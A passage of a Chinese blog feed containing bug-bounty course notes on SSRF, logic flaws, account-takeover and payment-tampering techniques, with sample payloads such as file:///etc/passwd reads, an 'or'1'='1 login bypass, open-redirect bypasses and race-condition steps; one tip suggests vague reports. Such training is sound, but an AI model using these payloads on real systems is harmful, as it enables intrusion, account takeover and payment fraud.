class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url: http://xx.com/url/scrapy</span><br><span class="line"></span><br><span class="line">POST Data: url=http://www.baidu.com</span><br></pre></td></tr></table></figure><p>多数情况下不支持其它协议，只能使用http协议</p><h2 id="案例2–地址"><a href="#案例2–地址" class="headerlink" title="案例2–地址"></a>案例2–地址</h2><p>根据功能点–图片地址、链接地址<br>输入地址检测SSRF的存在</p><h2 id="案例3–输入框"><a href="#案例3–输入框" class="headerlink" title="案例3–输入框"></a>案例3–输入框</h2><p>根据功能点–输入框<br>点击“一键检测”，就会在它们的移动终端浏览器访问且截图返回</p><p>在自己网站放一个文件，嵌入百度的内网地址，然后再检测网站里的文件。</p><h2 id="案例4–nday"><a href="#案例4–nday" class="headerlink" title="案例4–nday"></a>案例4–nday</h2><p>查找各个OA存在的nday。</p><h2 id="案例5和6–全过程利用"><a href="#案例5和6–全过程利用" class="headerlink" title="案例5和6–全过程利用"></a>案例5和6–全过程利用</h2><p>场景：原功能是生成一个课表长图。<br>通过一个请求包中最后的链接，返回包会生成一个图片，返回图片链接。</p><p>利用方式：将请求包中的url替换成DNSlog协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Accept-Encoding:gzip,deflate</span><br><span class="line">content-type:application/json</span><br><span class="line">Referer:</span><br><span class="line"></span><br><span class="line">&#123;&quot;url&quot;:&quot;file:///etc/network%00&quot;&#125;</span><br></pre></td></tr></table></figure><p>同样的原理：<br>编辑器，上传图片，正常情况: <code>![图片](链接)</code><br>利用方式: <code>![图片](file:///etc/passwd)</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;SSRF，CSRF，任意文件读取&amp;#x2F;下载，URL跳转的区别。漏洞课程第6节。&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SRC_course_9</title>
    <link href="http://example.com/2023/12/17/SRC_course_9/"/>
    <id>http://example.com/2023/12/17/SRC_course_9/</id>
    <published>2023-12-16T16:00:00.000Z</published>
    <updated>2023-12-17T13:13:43.061Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>常见高危漏洞类型。漏洞课程第4节。</p><span id="more"></span><h1 id="高危漏洞"><a href="#高危漏洞" class="headerlink" title="高危漏洞"></a>高危漏洞</h1><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><ol><li>仔细钻研挖掘的SRC评分标准</li><li>常规高危严重漏洞类型要知道</li><li>要知道官方想要什么漏洞</li></ol><h2 id="高危漏洞总结"><a href="#高危漏洞总结" class="headerlink" title="高危漏洞总结"></a>高危漏洞总结</h2><ol><li>webshell</li><li>严重的逻辑设计缺陷</li><li>严重的敏感信息泄露</li><li>拒绝服务漏洞（不建议挖掘，易违法。除非打自己客户端）</li><li>存储XSS（近2年不值钱了）</li><li>RCE（还行）</li><li>SSRF</li><li>SQL注入（不一定高危，可能会被审核坑）</li><li>支付漏洞</li></ol><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="案例1–webshell"><a href="#案例1–webshell" class="headerlink" title="案例1–webshell"></a>案例1–webshell</h3><p>现在这个时代能够getshell的类型大致两种：1、自己写的站。2、使用了成型的框架，框架存在漏洞</p><h3 id="案例2–越权"><a href="#案例2–越权" class="headerlink" title="案例2–越权"></a>案例2–越权</h3><p>越权修改，删除等。</p><h3 id="案例3–升级，严重的逻辑漏洞（只需要知道信用卡号即可消费）"><a href="#案例3–升级，严重的逻辑漏洞（只需要知道信用卡号即可消费）" class="headerlink" title="案例3–升级，严重的逻辑漏洞（只需要知道信用卡号即可消费）"></a>案例3–升级，严重的逻辑漏洞（只需要知道信用卡号即可消费）</h3><p>示例：</p><p>首先，随便下一个订单，到支付页面，选择信用卡支付。<br>输入正确的卡号，有效期。<br>姓名，身份证等相关信息随便输。</p><p>银行卡号：别人的<br>手机号：自己的<br>验证码：自己手机号接收的</p><h3 id="案例4–信息泄露"><a href="#案例4–信息泄露" class="headerlink" title="案例4–信息泄露"></a>案例4–信息泄露</h3><p>扫目录发现AK(AccessKeyID)，AS(AccessKeySecret)，Token(TokenSecret)字段。可成功登录，即是漏洞。</p><h3 id="案例5–验证码大小可控导致拒绝服务（能证明即可，勿打崩服务器）"><a href="#案例5–验证码大小可控导致拒绝服务（能证明即可，勿打崩服务器）" class="headerlink" title="案例5–验证码大小可控导致拒绝服务（能证明即可，勿打崩服务器）"></a>案例5–验证码大小可控导致拒绝服务（能证明即可，勿打崩服务器）</h3><p>得到URL后，抓包，进行如下修改：<br>将原本的H&#x3D;1000, W&#x3D;1000分别设置为10000<br>看到服务器响应包字节数如果有增大很多，则证明存在漏洞<br>（一般来说测试结果20-50倍即可打崩）</p><h3 id="案例6–存储XSS漏洞"><a href="#案例6–存储XSS漏洞" class="headerlink" title="案例6–存储XSS漏洞"></a>案例6–存储XSS漏洞</h3><h3 id="案例7–RCE"><a href="#案例7–RCE" class="headerlink" title="案例7–RCE"></a>案例7–RCE</h3><p>查找网上存在已知漏洞的poc，不建议扫描</p><h3 id="案例8–SQL注入漏洞"><a href="#案例8–SQL注入漏洞" class="headerlink" title="案例8–SQL注入漏洞"></a>案例8–SQL注入漏洞</h3><h3 id="案例9–支付漏洞"><a href="#案例9–支付漏洞" class="headerlink" title="案例9–支付漏洞"></a>案例9–支付漏洞</h3><p>订单编号可遍历</p><h3 id="案例10–任意文件下载"><a href="#案例10–任意文件下载" class="headerlink" title="案例10–任意文件下载"></a>案例10–任意文件下载</h3><p>目录穿越</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;常见高危漏洞类型。漏洞课程第4节。&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SRC_course_8</title>
    <link href="http://example.com/2023/12/15/SRC_course_8/"/>
    <id>http://example.com/2023/12/15/SRC_course_8/</id>
    <published>2023-12-14T16:00:00.000Z</published>
    <updated>2023-12-17T13:13:38.035Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本课讲述了逻辑漏洞的种类及应用。逻辑漏洞课程第2,3课内容。</p><span id="more"></span><h1 id="漏洞类型概览"><a href="#漏洞类型概览" class="headerlink" title="漏洞类型概览"></a>漏洞类型概览</h1><h2 id="任意用户漏洞"><a href="#任意用户漏洞" class="headerlink" title="任意用户漏洞"></a>任意用户漏洞</h2><h3 id="任意用户注册"><a href="#任意用户注册" class="headerlink" title="任意用户注册"></a>任意用户注册</h3><ol><li>可覆盖注册。将系统中存在的账号再次注册。多数情况下会接管，少数情况会变成新号。（高危）</li><li>不可覆盖注册。只能注册系统中不存在的账号。出现概率较高。（低危）</li></ol><h3 id="任意用户登录"><a href="#任意用户登录" class="headerlink" title="任意用户登录"></a>任意用户登录</h3><h3 id="任意用户密码重置"><a href="#任意用户密码重置" class="headerlink" title="任意用户密码重置"></a>任意用户密码重置</h3><h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>做了不属于自己权限的事。</p><ol><li>垂直越权</li><li>水平越权</li><li>不常见越权</li></ol><p>绕过方式1：删除字段（删除token或token以外的字段）<br>绕过方式2：cookie越权（修改可遍历的参数，可预知）<br>绕过方式3：绕过原始密码认证（低危或忽略）<br>绕过方式4：抓包控制信息泄露，避免跳转<br>绕过方式5：需要多个数据（若用户收货地址只有1个时不能删除）<br>绕过方式6：双因子绕过（需要修改uid和uuid，可遍历先尝试遍历，不可遍历尝试找泄露点）<br>绕过方式7：修改url路径参数值实现垂直越权（比如 <code>?app=user</code> 改为 <code>?app=admin</code> ）<br>绕过方式8：思路很重要（下订单时收货地址id可修改）<br>绕过方式9：思维（cookie中存在手机号，直接将手机号修改为任意11位数字）<br>绕过方式10：js（打开某地址，是一个登陆口，直接审计js，找到接口。）（插件findsthing）</p><h2 id="不同类型站点一览"><a href="#不同类型站点一览" class="headerlink" title="不同类型站点一览"></a>不同类型站点一览</h2><p>电商、论坛、直播、大学</p><h3 id="越权漏洞之构造参数（查找敏感信息，进行敏感操作）"><a href="#越权漏洞之构造参数（查找敏感信息，进行敏感操作）" class="headerlink" title="越权漏洞之构造参数（查找敏感信息，进行敏感操作）"></a>越权漏洞之构造参数（查找敏感信息，进行敏感操作）</h3><ol><li>先f12找到js里面的参数</li><li>只找到查找功能的menu列表的借口可以访问</li><li>根据经验，构造添加借口，<code>POST xxx.com/api/v1/menu</code><br>根据返回值构造数据包<br>数据<br><code>&#123;&quot;name&quot;:&quot;testest&quot;,&quot;type&quot;:&quot;1&quot;,&quot;parentId&quot;:&quot;-1&quot;,&quot;href&quot;:&quot;test1test&quot;&#125;,</code></li></ol><p>可以看到成功添加</p><p>经验总结:<br>后台模块的借口格式一般是</p><p>添加的接口一般是POST &#x2F;PUT &#x2F;api&#x2F;模块名，<br>POST &#x2F;api&#x2F;模块名&#x2F;add</p><p>删除的一般是 DELETE &#x2F;api&#x2F;模块名&#x2F;id<br>GET &#x2F;api&#x2F;模块名&#x2F;del?id&#x3D;<br>POST &#x2F;api&#x2F;模块名&#x2F;</p><p>修改一般是 POST &#x2F;api&#x2F;模块名&#x2F;modify<br>POST &#x2F;api&#x2F;模块名</p><p>查询一般是 GET &#x2F;api&#x2F;模块名&#x2F;list<br>&#x2F;api&#x2F;模块名&#x2F;all</p><p>如果js文件中只有查询的接口，那么可以自己尝试一下构造添加、修改和删除接口</p><p><strong>插件推荐</strong><br>js提取：JSFinder<br>工具地址: <code>https://github.com/Threezh1/JSFinder</code></p><p><strong>额外</strong></p><ol><li><p>巧用搜索引擎 Google hacker<br>示例:<br>保险业务 <code>保单 site:exc.com filetype:xls</code></p></li><li><p>组合拳：越权修改+xss<br>自己搭建盲打平台</p></li></ol><h2 id="其它逻辑漏洞"><a href="#其它逻辑漏洞" class="headerlink" title="其它逻辑漏洞"></a>其它逻辑漏洞</h2><p>以案例展示</p><h3 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h3><p>判定标准：一分钟内收到30（50）+条的短信。<br>分类：</p><ol><li>横向轰炸。可以给多个手机号同时发短信，这类漏洞大部分忽略。</li><li>纵向轰炸。给同一个手机号同时发多条短信。</li></ol><p>如果发短信&#x2F;邮件被限制，可选择：</p><ol><li>垃圾字符(英文字母)</li><li>垃圾字符(+86)</li><li>垃圾字符(空格)</li><li>双写(mobile&#x3D;13333333333,1343333333或mobile&#x3D;13333333333&amp;mobile&#x3D;1343333333)</li><li>XFF进行IP伪造(X-Forwarded-For: 127.0.0.1)(放在倒数第二排)（可用插件伪造ip，如X-Forwarded-For Header，burpfakeip）</li><li>邮箱轰炸可改大小写绕过(如: <code>111@qq.CoM</code> )</li></ol><h3 id="URL跳转漏洞（不值钱）"><a href="#URL跳转漏洞（不值钱）" class="headerlink" title="URL跳转漏洞（不值钱）"></a>URL跳转漏洞（不值钱）</h3><p>URL没有任何限制，所以恶意用户可以提交 <code>http://www.aaa.com/1.php?url=http://www.bbb.com</code> (跳转到钓鱼网站)来生成自己的恶意链接，安全意识较低的用户可能会被欺骗。</p><p>挖掘方式（参数下手）：redirect, redirect_to, url等等（或者直接尝试所有参数）<br>绕过方式1：单斜线“&#x2F;”绕过<br>绕过方式2：缺少协议绕过（ <code>?url=//www.evil.com</code> ）<br>绕过方式3：多斜线“&#x2F;”绕过（ <code>?url=///www.evil.com</code> ）<br>绕过方式4：@符号绕过<br>绕过方式5：反斜线“\”绕过<br>绕过方式6：#符号绕过<br>绕过方式7：?符号绕过<br>绕过方式8：“\\”绕过<br>绕过方式9：“.”绕过（ <code>?url=.evil.com</code> ）<br>绕过方式10：重复特殊字符绕过（ <code>?url=///www.evil.com//</code> ）</p><h3 id="电商漏洞"><a href="#电商漏洞" class="headerlink" title="电商漏洞"></a>电商漏洞</h3><p>提前购买：先选择能买的，然后将id修改为不能买的，实现提前购买。</p><h3 id="匿名漏洞（高危）"><a href="#匿名漏洞（高危）" class="headerlink" title="匿名漏洞（高危）"></a>匿名漏洞（高危）</h3><p>查看源代码，抓包查看。</p><h3 id="fuzz漏洞"><a href="#fuzz漏洞" class="headerlink" title="fuzz漏洞"></a>fuzz漏洞</h3><p>在注册时，存在隐藏参数，如: usertype&#x3D;1, userlevel&#x3D;1, userrank&#x3D;1等等。</p><h2 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h2><p>支付漏洞大致类型：</p><ol><li>低价充值；越权花别人的钱</li><li>服务年限延长；更少的钱获得服务并生成多个优惠订单</li><li>交易密码绕过</li></ol><h3 id="签约漏洞-高危"><a href="#签约漏洞-高危" class="headerlink" title="签约漏洞(高危)"></a>签约漏洞(高危)</h3><p>场景：<br>新用户购买vip，首月优惠价格6元，第2个月再次购买或续费就恢复原价10元。<br>购买时，两种支付手段：微信，支付宝。<br>分别生成一个订单，同时支付。获得2个月会员，并且仅支付12元。（或重放数据包，Repeater同时支付。并发。）</p><h2 id="并发漏洞"><a href="#并发漏洞" class="headerlink" title="并发漏洞"></a>并发漏洞</h2><p>使用工具：burp 或 fd</p><p>burp插件：Turbo Intruder<br>安装好插件后使用方法: </p><ol><li>右键 <code>Send to Turbo Intruder</code></li><li>上半部分模块打上 <code>x-req:%s</code></li><li>中间改为 <code>examples/race.py</code></li><li>最后Attack</li></ol><h1 id="案例分享"><a href="#案例分享" class="headerlink" title="案例分享"></a>案例分享</h1><p>爆破需要挂代理IP池，否则ip会被封。</p><h2 id="任意用户漏洞-1"><a href="#任意用户漏洞-1" class="headerlink" title="任意用户漏洞"></a>任意用户漏洞</h2><h3 id="案例1–四位数验证码可爆破"><a href="#案例1–四位数验证码可爆破" class="headerlink" title="案例1–四位数验证码可爆破"></a>案例1–四位数验证码可爆破</h3><p>任何需要发验证码的地方都可能存在。<br>登录口存在该漏洞，是高危漏洞。<br>登录进入存在该漏洞，一般是中危或低危。（可自评高危）<br>六位数验证码可爆破漏洞，可收。（中危）</p><p>严重漏洞慎选。</p><h3 id="案例2–验证码回显"><a href="#案例2–验证码回显" class="headerlink" title="案例2–验证码回显"></a>案例2–验证码回显</h3><p>返回包中存在正确的验证码。</p><h3 id="案例3–只验证了验证码，未做绑定验证"><a href="#案例3–只验证了验证码，未做绑定验证" class="headerlink" title="案例3–只验证了验证码，未做绑定验证"></a>案例3–只验证了验证码，未做绑定验证</h3><p>在手机号收到验证码后，更改手机号。相当于用他人手机号注册账号。</p><h3 id="案例4–修改返回包"><a href="#案例4–修改返回包" class="headerlink" title="案例4–修改返回包"></a>案例4–修改返回包</h3><p>修改返回包：false改为success, true, 400, 200, 0, 1, -1<br>返回包修改方式：在Burp软件的Proxy模块下修改。</p><h3 id="案例5–双写"><a href="#案例5–双写" class="headerlink" title="案例5–双写"></a>案例5–双写</h3><p>示例：</p><p>以上略…<br>Cookie:<br>Connection: keep-alive<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 60</p><p>mobile&#x3D;13512312312&amp;code&#x3D;12390  (正常情况)<br>mobile&#x3D;13512312312, 13500000000, 13333333333&amp;code&#x3D;12390  (修改方式1)<br>mobile&#x3D;13512312312&amp;mobile&#x3D;13500000000&amp;code&#x3D;12390  (修改方式2)</p><h3 id="案例6–第三方登录"><a href="#案例6–第三方登录" class="headerlink" title="案例6–第三方登录"></a>案例6–第三方登录</h3><p>示例：<br>在第三方平台中登录选择微博登录，然后会返回一个数据包，修改数据包uid即可登录对应的账号（问题在于第三方平台未做好配置）</p><h3 id="案例7–随意验证码"><a href="#案例7–随意验证码" class="headerlink" title="案例7–随意验证码"></a>案例7–随意验证码</h3><p>找回密码，获取验证码，填写任意验证码即可（不管验证码是什么，随便填一个6位数的数字）</p><h3 id="案例8–验证码为空"><a href="#案例8–验证码为空" class="headerlink" title="案例8–验证码为空"></a>案例8–验证码为空</h3><p>找回密码，获取验证码，验证码字段写成null或留空</p><h3 id="案例9–奇葩绕过"><a href="#案例9–奇葩绕过" class="headerlink" title="案例9–奇葩绕过"></a>案例9–奇葩绕过</h3><p>示例：</p><p>找回密码场景中：<br>输入用户名admin，在下发验证码时将手机号改为自己的手机号（返回包中修改），从而利用自己手机号接收验证码，重置他人账号。</p><h3 id="案例10–重置链接"><a href="#案例10–重置链接" class="headerlink" title="案例10–重置链接"></a>案例10–重置链接</h3><p>点击密码重置输入自己的账号，自己邮箱会收到这样的重置链接。</p><h3 id="案例11–万能密码（注入）"><a href="#案例11–万能密码（注入）" class="headerlink" title="案例11–万能密码（注入）"></a>案例11–万能密码（注入）</h3><p>通过asp，aspx，php，jsp等的万能密码登入账号。<br>示例任意用户登录：admin’or’1’&#x3D;’1</p><h3 id="案例12–输入用户名获取当前用户信息"><a href="#案例12–输入用户名获取当前用户信息" class="headerlink" title="案例12–输入用户名获取当前用户信息"></a>案例12–输入用户名获取当前用户信息</h3><p>当在登录口或找回密码界面，输入用户名后，发现自动发送一个请求包检测用户名是否存在，返回包中获得密码或md5加密的密码。</p><h3 id="案例13–修改url跳过步骤"><a href="#案例13–修改url跳过步骤" class="headerlink" title="案例13–修改url跳过步骤"></a>案例13–修改url跳过步骤</h3><p>示例：<br>假设找回密码地址第一步: <code>http://www.xxx.com/u/getpwd1.html</code><br>第一步输入邮箱和验证码开始找回密码，<br>第二步将url参数从2改为3，变成 <code>http://www.xxx.com/u/getpwd3.html</code> ，从而直接到达重置密码的第3步。<br>第三步重置密码，退出后验证是否能够重新登录，如果能则说明存在漏洞。</p><h3 id="案例14–平台存在初始密码，使用爆破手段将全站未修改初始密码的账号获取"><a href="#案例14–平台存在初始密码，使用爆破手段将全站未修改初始密码的账号获取" class="headerlink" title="案例14–平台存在初始密码，使用爆破手段将全站未修改初始密码的账号获取"></a>案例14–平台存在初始密码，使用爆破手段将全站未修改初始密码的账号获取</h3><h3 id="案例15–请求包中存在userid或其它字符，修改userid能以自己账号修改他人密码"><a href="#案例15–请求包中存在userid或其它字符，修改userid能以自己账号修改他人密码" class="headerlink" title="案例15–请求包中存在userid或其它字符，修改userid能以自己账号修改他人密码"></a>案例15–请求包中存在userid或其它字符，修改userid能以自己账号修改他人密码</h3><h3 id="案例16–通用框架漏洞"><a href="#案例16–通用框架漏洞" class="headerlink" title="案例16–通用框架漏洞"></a>案例16–通用框架漏洞</h3><h2 id="越权漏洞-1"><a href="#越权漏洞-1" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><h3 id="案例1–常见id越权"><a href="#案例1–常见id越权" class="headerlink" title="案例1–常见id越权"></a>案例1–常见id越权</h3><p>重点关注的点：<br>收货地址<br>用户<br>编辑<br>预览（草稿回收站）<br>报告（采购）<br>订单（抽奖 付款）</p><h2 id="并发漏洞（30次以内，需代理）"><a href="#并发漏洞（30次以内，需代理）" class="headerlink" title="并发漏洞（30次以内，需代理）"></a>并发漏洞（30次以内，需代理）</h2><h3 id="案例1–成功刷赞"><a href="#案例1–成功刷赞" class="headerlink" title="案例1–成功刷赞"></a>案例1–成功刷赞</h3><p><strong>报告示例</strong> （避开复现过程，审核太弱）<br>标题：xx存在并发刷赞漏洞可随意控制排名<br>自评等级：结合具体情况分析<br>详细内容：来到 <code>http://www.xx.com/1.html</code> , 点赞，抓包<br>【贴上原始页面图片】<br>（贴出的数据包：不带x-req:%s的数据包）<br>直接并发，并发成功，可以看到成功刷赞<br>【贴上刷赞成功页面图片】<br>危害：结合具体情况分析<br>修复建议：数据库加锁</p><h3 id="案例2–签到"><a href="#案例2–签到" class="headerlink" title="案例2–签到"></a>案例2–签到</h3><p>根据危害情况，漏洞危害判定为忽略到高危不等。</p><h3 id="案例3–突破限购"><a href="#案例3–突破限购" class="headerlink" title="案例3–突破限购"></a>案例3–突破限购</h3><h3 id="案例4–突破地址限制"><a href="#案例4–突破地址限制" class="headerlink" title="案例4–突破地址限制"></a>案例4–突破地址限制</h3><h3 id="案例5–文件上传-实际用处不大"><a href="#案例5–文件上传-实际用处不大" class="headerlink" title="案例5–文件上传(实际用处不大)"></a>案例5–文件上传(实际用处不大)</h3><h3 id="案例6–领券"><a href="#案例6–领券" class="headerlink" title="案例6–领券"></a>案例6–领券</h3><h3 id="案例7–刷积分"><a href="#案例7–刷积分" class="headerlink" title="案例7–刷积分"></a>案例7–刷积分</h3><h3 id="案例8–提现"><a href="#案例8–提现" class="headerlink" title="案例8–提现"></a>案例8–提现</h3><h3 id="案例9–抽奖"><a href="#案例9–抽奖" class="headerlink" title="案例9–抽奖"></a>案例9–抽奖</h3><h3 id="案例10–下单"><a href="#案例10–下单" class="headerlink" title="案例10–下单"></a>案例10–下单</h3><h2 id="支付漏洞-1"><a href="#支付漏洞-1" class="headerlink" title="支付漏洞"></a>支付漏洞</h2><h3 id="案例1–负数购买"><a href="#案例1–负数购买" class="headerlink" title="案例1–负数购买"></a>案例1–负数购买</h3><p>正常情况：200(余额)-2*10(单价)&#x3D;180<br>hack：200-(-2)*10&#x3D;220</p><h3 id="案例2–修改内容"><a href="#案例2–修改内容" class="headerlink" title="案例2–修改内容"></a>案例2–修改内容</h3><p>场景：云主机购买逻辑设计不严密，经过base64编码的数据可以被篡改，实现原有买低配的价格可以直接买高配。比如将带宽从5M修改为200M，CPU从2核修改为8核…(价格未变或是降低，算是成功)</p><h3 id="案例3–修改金额"><a href="#案例3–修改金额" class="headerlink" title="案例3–修改金额"></a>案例3–修改金额</h3><ol><li>负数</li><li>金额变小</li><li>小数点前移，从199变成1.99</li><li>修改的金额系统内置：比如一个东西，普通人买100元，员工买1元。</li></ol><p>注意点：修改内容要一一对应，了解逻辑。</p><h3 id="案例4–无限重放-并发"><a href="#案例4–无限重放-并发" class="headerlink" title="案例4–无限重放(并发)"></a>案例4–无限重放(并发)</h3><p>运用场景：优惠券，退款…</p><h3 id="案例5–修改运费"><a href="#案例5–修改运费" class="headerlink" title="案例5–修改运费"></a>案例5–修改运费</h3><h3 id="案例6–修改下单金额"><a href="#案例6–修改下单金额" class="headerlink" title="案例6–修改下单金额"></a>案例6–修改下单金额</h3><h3 id="案例7–正负叠加"><a href="#案例7–正负叠加" class="headerlink" title="案例7–正负叠加"></a>案例7–正负叠加</h3><p>示例：<br>随便购买两件商品，商品为数量一正一负提交订单<br>30(A商品)*1-10(B商品)*2&#x3D;10</p><h3 id="案例8–优惠券漏洞"><a href="#案例8–优惠券漏洞" class="headerlink" title="案例8–优惠券漏洞"></a>案例8–优惠券漏洞</h3><p>抓包修改优惠券金额</p><h3 id="案例9–优惠券漏洞"><a href="#案例9–优惠券漏洞" class="headerlink" title="案例9–优惠券漏洞"></a>案例9–优惠券漏洞</h3><p>注意数据包，一定要各个金额保持一致</p><h3 id="案例10–溢出漏洞"><a href="#案例10–溢出漏洞" class="headerlink" title="案例10–溢出漏洞"></a>案例10–溢出漏洞</h3><p>漏洞成因：int32最大值为4294967296，充值98998996172801，支付溢出</p><h3 id="案例11–更改购买类型"><a href="#案例11–更改购买类型" class="headerlink" title="案例11–更改购买类型"></a>案例11–更改购买类型</h3><p>场景：一个成人800和一个儿童180，抓包将“成人”类型修改为儿童，得到总价360</p><h1 id="如何挖"><a href="#如何挖" class="headerlink" title="如何挖"></a>如何挖</h1><p>掌握漏洞类型–确定资产–功能点分析–耐心</p><h2 id="挖洞心法"><a href="#挖洞心法" class="headerlink" title="挖洞心法"></a>挖洞心法</h2><ol><li>明确自己要挖什么类型的漏洞</li><li>明确这个站大概会有什么类型的漏洞：nday，自己的知识</li><li>耐心</li><li>明确各个平台重点关注的漏洞，优先挖掘价值较高漏洞。</li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本课讲述了逻辑漏洞的种类及应用。逻辑漏洞课程第2,3课内容。&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SRC_course_7</title>
    <link href="http://example.com/2023/12/11/SRC_course_7/"/>
    <id>http://example.com/2023/12/11/SRC_course_7/</id>
    <published>2023-12-10T16:00:00.000Z</published>
    <updated>2023-12-15T12:10:55.693Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本课主要介绍挖漏洞的注意事项。这是逻辑漏洞课程第一课。</p><span id="more"></span><h1 id="挖不到漏洞的原因"><a href="#挖不到漏洞的原因" class="headerlink" title="挖不到漏洞的原因"></a>挖不到漏洞的原因</h1><ol><li>懒。打开的站点不超过100个。</li><li>不自信。短信轰炸，邮箱轰炸。</li><li>技术思路有欠缺。</li><li>目前的方法错误。看的资料有误；信息收集过度（注重收集不注重挖洞），更注重特权账号（正常手段拿不到的账号都叫特权账号），获取特权账号的手段：1、买；2、自己营业执照注册；3、src活动一般都会提供；4、爆破；5、漏洞进去的。</li></ol><h1 id="工具环境的准备"><a href="#工具环境的准备" class="headerlink" title="工具环境的准备"></a>工具环境的准备</h1><ol><li><p>burp</p></li><li><p>burp插件</p></li></ol><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><h2 id="不要非法搞站，没有授权的站不要碰"><a href="#不要非法搞站，没有授权的站不要碰" class="headerlink" title="不要非法搞站，没有授权的站不要碰"></a>不要非法搞站，没有授权的站不要碰</h2><h3 id="不可搞的"><a href="#不可搞的" class="headerlink" title="不可搞的"></a>不可搞的</h3><ol><li><p>挖洞过程不要把站打崩、不要影响线上业务等等，一些src公告里明确的红线都不要碰。</p></li><li><p>不要碰公益SRC</p></li><li><p>没有授权的站不挖</p></li><li><p>情报不要搞。人身安全的风险较大。<br>挖洞分三种：1、漏洞 2、隐私合规 3、威胁情报（威胁情报即为发现有人卖差评，有人卖挂，有人具有大量电商数据，某公司用户数据，抓内鬼等提交信息即可，能否得钱看运气，可获得几千至几万）</p></li></ol><h3 id="网上的xss盲打平台不要用"><a href="#网上的xss盲打平台不要用" class="headerlink" title="网上的xss盲打平台不要用"></a>网上的xss盲打平台不要用</h3><h3 id="挖授权站的时候，不要动数据、越权修改就修改自己的"><a href="#挖授权站的时候，不要动数据、越权修改就修改自己的" class="headerlink" title="挖授权站的时候，不要动数据、越权修改就修改自己的"></a>挖授权站的时候，不要动数据、越权修改就修改自己的</h3><p>可以自己注册2个账号，删除另一个的账号</p><h3 id="查看SRC公告"><a href="#查看SRC公告" class="headerlink" title="查看SRC公告"></a>查看SRC公告</h3><ol><li><p>注入漏洞不要读表单数据，能证明存在漏洞即可。</p></li><li><p>越权漏洞，查看不超过5组数据</p></li><li><p>自定义严重</p></li><li><p>定级标准</p></li><li><p>奖励</p></li><li><p>范围：根域名，子域名</p></li></ol><h2 id="能搞的"><a href="#能搞的" class="headerlink" title="能搞的"></a>能搞的</h2><h3 id="类似bat-src的企业自建src"><a href="#类似bat-src的企业自建src" class="headerlink" title="类似bat src的企业自建src"></a>类似bat src的企业自建src</h3><p>各大企业src：</p><ol><li>bsrc</li><li>丁香园src</li><li>汽车之家src</li></ol><h3 id="众测平台的私密项目（勿碰公益项目）"><a href="#众测平台的私密项目（勿碰公益项目）" class="headerlink" title="众测平台的私密项目（勿碰公益项目）"></a>众测平台的私密项目（勿碰公益项目）</h3><ol><li><p>漏洞盒子 - 金融类较多 - 难度中等偏上，有能力再尝试</p></li><li><p>补天众测不等于补天平台：1、zf  2、如何参与补天众测（补天众测的白帽子推荐，在补天总榜前300且年度；可以挖到5个以上的企业src的高危漏洞；任意一个大型src年度top3）3、不同级别的人看的项目不同</p></li><li><p>360众测 - 门票ctf</p></li><li><p>火线平台</p></li></ol><h2 id="资产收集"><a href="#资产收集" class="headerlink" title="资产收集"></a>资产收集</h2><ol><li><p>看公告<br>明确资产范围：根域名（ip，子域名）<br>app<br>小程序<br>奖励标准<br>红线</p></li><li><p>根域名<br>根据公告、活动<br>企查查、备案<br>dns</p></li><li><p>根域名<br>活动挖洞 - 搞了一次活动 - 对人的要求最高 - 竞争压力大（快、准）；资产范围小<br>全心全意挖洞 - 全部都要找出来</p></li><li><p>子域名收集<br>灯塔ARL、shuize，layer，oneforall<br>hunter，fofa，360quanke等空间测绘产品</p></li><li><p>ip</p></li><li><p>app、小程序、公众号</p></li></ol><h2 id="企业SRC"><a href="#企业SRC" class="headerlink" title="企业SRC"></a>企业SRC</h2><p>挖漏洞的几家平台选择</p><ol><li><p>麦当劳中国安全应急响应中心<br><a href="https://security.mcd.cn/">https://security.mcd.cn/</a></p></li><li><p>顺丰安全应急响应中心<br><a href="https://sfsrc.sf-express.com/">https://sfsrc.sf-express.com/</a></p></li><li><p>美团安全应急响应中心<br><a href="https://security.meituan.com/">https://security.meituan.com/</a></p></li><li><p>OPPO安全应急响应中心<br><a 